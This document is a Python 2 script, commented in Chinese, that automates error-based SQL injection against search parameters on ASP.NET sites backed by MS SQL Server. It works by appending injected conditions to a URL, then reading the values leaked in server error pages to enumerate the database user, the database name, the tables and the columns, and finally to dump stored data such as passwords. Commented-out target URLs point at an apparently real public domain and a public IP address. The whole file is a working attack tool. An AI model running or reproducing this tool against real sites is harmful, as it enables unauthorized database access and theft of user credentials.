#coding=utf8

#Author：陕晨阳
#说明：针对asp.net网站的搜索型sql注入，有时使用sqlmap注入效果不佳，就写了一个基于错误回显的sql注入脚本，免去繁重的手工过程

import urllib

#url是注入点的url，最好手测一下注入点
#url = 'http://www.xdqwlgbj.com/Page/il.aspx?cs=0,57,1,'
#url = 'http://218.26.178.9/search.aspx?keyword='
url = 'http://192.168.2.37:88/news/NewsListTitle.aspx?Title='

sa_dbo = "'and user>0 and '%'='"
current_db = "'and db_name()>0 and '%'='"
	
def get_keyword(url):
	sock = urllib.urlopen(url)
	html = sock.read()
	code = sock.code
	sock.close()
	start = html.find("'")+1
	end = html.find("'",start+1)
	return code==500 and html[start:end] or 'stop_get'

def get_user_type():
	real_url = url+sa_dbo
	print u"当前SQL权限："+get_keyword(real_url)
	
def get_current_db():
	real_url = url+current_db
	db_name = get_keyword(real_url)
	print u"当前数据库名称："+db_name
	return db_name
	
#dbs = "'and (select top 1 name from XXX.dbo.sysobjects where xtype='u')>0 and '%'='"
def get_db_tables(db):
	print u"当前数据库表名："
	real_url = url+"'and (select top 1 name from "+db+".dbo.sysobjects where xtype='u')>0 and '%'='"
	table = get_keyword(real_url)
	print table
	tables= []
	tables.append(table)
	key_url = ''
	while table!='stop_get':
		key_url += " and name not in('"+table+"')"
		real_url = url+"'and (select top 1 name from "+db+".dbo.sysobjects where xtype='u'"+key_url+")>0 and '%'='"
		table = get_keyword(real_url)
		if table!='stop_get':
			tables.append(table)
			print table

def get_table_columns(table):
	print u"表"+table+u"字段："
	column = ''
	columns = []
	i = 1
	while column!='stop_get':
		real_url = url+"'and (select top 1 col_name(object_id ('"+table+"'),"+str(i)+") from "+table+")>0 and '%'='"
		column = get_keyword(real_url)
		if column!='stop_get':
			columns.append(column)
			i+=1
			print column+',',
	print '\n'

#'and (select top 1 字段 from 表)>0 and '%'='
def get_table_columns_dump(table,columns):
	print u"表"+table+u"字段["+columns+u"]："
	lst_column = columns.split(',')
	for column in lst_column:
		real_url = url+"'and (select top 1 "+column+" from "+table+")>0 and '%'='"
		dump = get_keyword(real_url)
		if dump!='stop_get':
			print dump,
		else:
			print u'不能获取密码字段'
			print u"URL："+real_url
			break
	print '\n'
	dumps= []
	dumps.append(dump)
	key_url = ''
	while dump!='stop_get':
		for column in lst_column:
			key_url += " where "+column+" not in('"+dump+"')"
			real_url = url+"'and (select top 1 "+column+" from "+table+key_url+")>0 and '%'='"
			dump = get_keyword(real_url)
			if dump!='stop_get':
				dumps.append(dump)
				print dump,
		print '\n'
			
def main():
	get_user_type()
	db = get_current_db()
	get_db_tables(db)
	table = raw_input("\nchoose table: ")
	get_table_columns(table)
	columns = raw_input("\nchoose columns: ")
	get_table_columns_dump(table,columns)
	
if __name__=='__main__':
	main()